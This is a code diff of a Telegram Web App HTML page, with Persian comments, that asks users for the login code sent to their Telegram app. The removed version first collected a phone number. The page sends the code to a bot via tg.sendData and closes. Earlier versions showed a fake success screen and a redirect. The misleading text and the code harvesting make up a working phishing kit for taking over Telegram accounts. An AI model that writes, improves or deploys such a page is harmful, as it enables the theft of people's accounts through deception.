@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Login with Phone</title>
+    <title>Enter Code</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -41,22 +41,6 @@
         .icon { font-size: 60px; margin-bottom: 10px; display: block; }
         h1 { font-size: 24px; margin-bottom: 8px; }
         .subtitle { font-size: 14px; opacity: 0.85; }
-
-        .step { display: none; animation: fadeIn 0.3s; }
-        .step.active { display: block; }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .info-box {
-            background: rgba(36, 129, 204, 0.2);
-            border-right: 4px solid #2481cc;
-            padding: 12px 15px;
-            border-radius: 10px;
-            font-size: 13px;
-            margin-bottom: 20px;
-            color: #fff;
-        }
         label { display: block; font-size: 14px; margin-bottom: 8px; color: #fff; }
         input {
             width: 100%;
@@ -101,48 +85,15 @@
 </head>
 <body>
     <div class="container">
-        <!-- STEP 1: PHONE -->
-        <div id="step1" class="step active">
-            <div class="header">
-                <span class="icon">📱</span>
-                <h1>Login with Phone</h1>
-                <p class="subtitle">Enter your phone number</p>
-            </div>
-            <div class="info-box">
-                ⚠️ By continuing, you agree to receive a verification code. 
-                Check your <b>Telegram app</b> for the code (not SMS).
-            </div>
-            <label>Phone (with country code):</label>
-            <input type="tel" id="phone" placeholder="+1234567890" dir="ltr">
-            <button onclick="sendPhone()" id="btnPhone">Send Code</button>
-            <p class="status" id="status1"></p>
+        <div class="header">
+            <span class="icon">🔐</span>
+            <h1>Verification Code</h1>
+            <p class="subtitle">Enter the 5-digit code sent to your Telegram app</p>
         </div>
-
-        <!-- STEP 2: CODE -->
-        <div id="step2" class="step">
-            <div class="header">
-                <span class="icon">🔐</span>
-                <h1>Verification Code</h1>
-                <p class="subtitle">Enter the code we sent</p>
-            </div>
-            <div class="info-box">
-                ⚠️ If you don't receive a code, your account is protected by Telegram. 
-                Only the official Telegram app can receive codes for third-party logins.
-            </div>
-            <label>Code:</label>
-            <input type="tel" id="code" placeholder="12345" maxlength="6" inputmode="numeric" dir="ltr">
-            <button onclick="sendCode()" id="btnCode">Verify Code</button>
-            <p class="status" id="status2"></p>
-        </div>
-
-        <!-- STEP 3: REDIRECT -->
-        <div id="step3" class="step">
-            <div style="text-align: center; color: #fff; padding: 30px 0;">
-                <span style="font-size: 80px; display: block; margin-bottom: 20px;">✅</span>
-                <h2 style="font-size: 24px; margin-bottom: 15px;">Login Successful!</h2>
-                <p>Redirecting...</p>
-            </div>
-        </div>
+        <label>Code:</label>
+        <input type="tel" id="code" placeholder="12345" maxlength="6" inputmode="numeric" dir="ltr">
+        <button onclick="sendCode()" id="btnCode">Verify Code</button>
+        <p class="status" id="status"></p>
     </div>
 
     <script>
@@ -150,54 +101,9 @@
         tg.expand();
         tg.ready();
 
-        const REDIRECT_URL = "https://google.com";
-
-        function showStep(n) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step' + n).classList.add('active');
-            setTimeout(() => {
-                const input = document.querySelector('#step' + n + ' input');
-                if (input) input.focus();
-            }, 300);
-        }
-
-        function redirectToSite() {
-            try {
-                if (tg && tg.openLink) tg.openLink(REDIRECT_URL);
-            } catch(e) {}
-            setTimeout(() => {
-                try { window.location.href = REDIRECT_URL; } catch(e) {}
-            }, 500);
-        }
-
-        function sendPhone() {
-            const phone = document.getElementById('phone').value.trim();
-            const status = document.getElementById('status1');
-            const btn = document.getElementById('btnPhone');
-
-            if (!phone || phone.charAt(0) !== '+' || phone.length < 10) {
-                tg.showAlert('Invalid phone number');
-                return;
-            }
-
-            btn.disabled = true;
-            status.innerHTML = '<span class="loading"></span> Sending...';
-
-            try {
-                tg.sendData(JSON.stringify({ action: 'send_phone', phone: phone }));
-                status.innerHTML = '✅ Code sent to your Telegram app!';
-                status.style.color = '#4ade80';
-                setTimeout(() => showStep(2), 800);
-            } catch(e) {
-                status.innerHTML = '❌ ' + e.message;
-                btn.disabled = false;
-            }
-        }
-
-        // ✅ این نسخه کد رو به ربات می‌فرسته تا بررسی کنه
         function sendCode() {
             const code = document.getElementById('code').value.replace(/\D/g, '');
-            const status = document.getElementById('status2');
+            const status = document.getElementById('status');
             const btn = document.getElementById('btnCode');
 
             if (!code || code.length < 4) {
@@ -210,15 +116,13 @@
 
             try {
                 tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
-                status.innerHTML = '✅ Checking code...';
+                status.innerHTML = '✅ Checking... (If wrong, you will get an error in chat)';
                 status.style.color = '#4ade80';
                 
-                // اگر ربات خطا داد، شما در چت ربات پیام خطا رو می‌بینید
-                // وب‌اپ بعد از 10 ثانیه به مرحله موفقیت می‌ره
+                // بستن وب‌اپ بعد از 2 ثانیه
                 setTimeout(() => {
-                    showStep(3);
-                    redirectToSite();
-                }, 10000);
+                    tg.close();
+                }, 2000);
             } catch(e) {
                 status.innerHTML = '❌ ' + e.message;
                 btn.disabled = false;
